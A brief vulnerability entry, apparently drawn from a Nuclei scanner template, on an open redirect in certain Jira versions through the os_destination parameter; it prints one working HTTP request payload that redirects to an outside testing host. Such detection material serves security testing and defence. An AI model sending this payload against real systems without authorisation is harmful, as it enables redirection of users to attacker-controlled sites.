# Vulnerability: JIRA in HTTPS mode - Open Redirect
**Classification:** CWE-601
**Source:** Nuclei Template (`jira-https-mode-open-redirect.yaml`)

## Description
Detected Open redirect vulnerability in Jira via os_destination parameter versions 5.2.11, 6.2, and 6.2.2.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/ThisCanBeAnything?os_destination=%2F%2Foast.pro
```

